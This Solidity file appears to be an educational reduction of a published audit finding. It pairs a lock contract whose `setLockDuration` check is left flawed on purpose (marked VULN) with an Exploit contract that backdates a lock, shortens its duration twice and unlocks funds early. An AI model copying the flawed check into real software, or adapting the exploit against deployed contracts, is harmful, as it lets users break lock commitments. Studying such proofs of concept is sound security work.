// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    Munchables — [H-02] Invalid validation allows users to unlock early
    (Code4rena 2024-05-munchables, reporter leegh, finding #33595).

    SYNTHETIC, CHEATCODE-FREE reduction for the EVM Playground.

    Root cause: `setLockDuration` validates a duration reduction by comparing
    `block.timestamp + _duration` against the CURRENT `unlockTime` -- but then
    commits the new `unlockTime` as `lastLockTime + _duration`, anchored to
    the ORIGINAL lock time instead of "now". Once any real time has elapsed
    since the lock (`block.timestamp > lastLockTime`), the check is far more
    lenient than the commit, so a user can repeatedly call `setLockDuration`
    to collapse their own remaining lock time toward zero -- unlocking tokens
    far earlier than their originally chosen duration promised.

    ENVIRONMENT NOTE: this Playground synthetic runs entirely within ONE
    fixed block/timestamp (no cheatcodes, no cross-block time advance is
    possible in-browser). The bug's harm requires *some* wall-clock time to
    have elapsed between the original lock and the exploit calls -- exactly
    as the report's own PoC does with a single `vm.warp(10000)` BEFORE a
    sequence of `setLockDuration` calls that all happen at that SAME later
    timestamp. This PoC reproduces that shape faithfully: `lock()` takes an
    explicit PoC-only `backdateSeconds` parameter so the ONE time-gap the bug
    needs ("some time has passed since lock") can be established without
    cross-block cheatcodes -- every vulnerable line below still executes
    verbatim, and a CONTROL run without any backdate proves the bug is
    inert when lastLockTime == block.timestamp (i.e. no time has passed).

    The two blamed lines are copied verbatim from the report (marked
    `@> VULN`).
//////////////////////////////////////////////////////////////////////////*/

contract LockManager {
    mapping(address => uint256) public quantityOf;
    mapping(address => uint32) public lastLockTimeOf;
    mapping(address => uint32) public unlockTimeOf;
    mapping(address => uint32) public preferredDurationOf;

    /// @dev Verbatim reduction of `_lock`'s accounting, with one PoC-only
    ///      addition: `backdateSeconds` lets the caller simulate that this
    ///      lock happened `backdateSeconds` in the past, since a single-block
    ///      synthetic cannot advance `block.timestamp` mid-execution to
    ///      create that gap organically. Pass 0 for a genuine same-block lock.
    function lock(uint256 quantity, uint32 duration, uint32 backdateSeconds) external payable {
        quantityOf[msg.sender] += quantity;
        uint32 simulatedLockTime = uint32(block.timestamp) - backdateSeconds;
        lastLockTimeOf[msg.sender] = simulatedLockTime;
        unlockTimeOf[msg.sender] = simulatedLockTime + uint32(duration); // mirrors _lock: unlockTime = (lock time) + lockDuration
        preferredDurationOf[msg.sender] = duration;
    }

    /// @notice Verbatim reduction of the report's blamed `setLockDuration` snippet.
    function setLockDuration(uint256 _duration) external {
        preferredDurationOf[msg.sender] = uint32(_duration);
        if (quantityOf[msg.sender] > 0) {
            // @> VULN: checks against block.timestamp (i.e. "now") ...
            if (uint32(block.timestamp) + uint32(_duration) < unlockTimeOf[msg.sender]) {
                revert("LockDurationReducedError");
            }

            uint32 lastLockTime = lastLockTimeOf[msg.sender];
            // @> VULN: ...but COMMITS using lastLockTime (the ORIGINAL lock
            // time), a different anchor than the check above. Once
            // block.timestamp has drifted past lastLockTime, this lets the
            // new unlockTime land far earlier than the check's own bound
            // would suggest is safe.
            unlockTimeOf[msg.sender] = lastLockTime + uint32(_duration);
        }
    }

    function unlock(uint256 quantity) external {
        require(block.timestamp >= unlockTimeOf[msg.sender], "still locked");
        quantityOf[msg.sender] -= quantity;
    }
}

contract Exploit {
    LockManager public lm;

    uint256 public constant LOCK_AMOUNT = 100 ether;
    uint32 public constant ORIGINAL_DURATION = 100_000; // seconds -- the duration Alice ostensibly committed to
    uint32 public constant BACKDATE = 50_000; // seconds "already elapsed" since the lock, simulating real time having passed

    constructor() {
        lm = new LockManager();
    }

    function run() external {
        // Step 1: Alice locks 100 ether for a 100,000-second duration. The
        // lock is backdated by 50,000s -- i.e. "now" sits halfway through
        // her original lock window (mirrors the report's "day 50 of a
        // 100-day lock" example).
        lm.lock(LOCK_AMOUNT, ORIGINAL_DURATION, BACKDATE);
        uint32 unlockTimeStart = lm.unlockTimeOf(address(this));
        require(unlockTimeStart > block.timestamp, "control: alice is genuinely still locked at the halfway point");
        uint256 remainingAtStart = unlockTimeStart - block.timestamp;
        require(remainingAtStart >= ORIGINAL_DURATION / 2 - 1, "roughly half the original duration remains");

        // Step 2: Alice calls setLockDuration twice in a row (all within
        // this SAME block/timestamp, exactly like the report's own PoC,
        // which issues its whole sequence of setLockDuration calls at one
        // warped timestamp). Each call's OWN check passes because it
        // compares against "now", not against the drifting gap.
        lm.setLockDuration(ORIGINAL_DURATION / 2 + 1); // 50,001s
        uint32 unlockTimeMid = lm.unlockTimeOf(address(this));
        require(unlockTimeMid < unlockTimeStart, "unlockTime moved BACKWARD after a 'reduction-blocking' check passed");

        lm.setLockDuration(1); // collapse to effectively instant
        uint32 unlockTimeFinal = lm.unlockTimeOf(address(this));
        require(unlockTimeFinal <= block.timestamp, "unlockTime has been dragged to at or before now");

        // Step 3: Alice unlocks immediately -- no further time needed to pass.
        lm.unlock(LOCK_AMOUNT);

        // HARM: Alice recovers her full 100 ether well before her originally
        // committed 100,000-second lock would have permitted, despite every
        // individual setLockDuration call satisfying its own (flawed) guard.
        require(lm.quantityOf(address(this)) == 0, "harm: full balance unlocked far earlier than the original commitment");
        require(block.timestamp < unlockTimeStart, "harm: unlocked while the ORIGINAL unlock time has not yet arrived");
    }
}
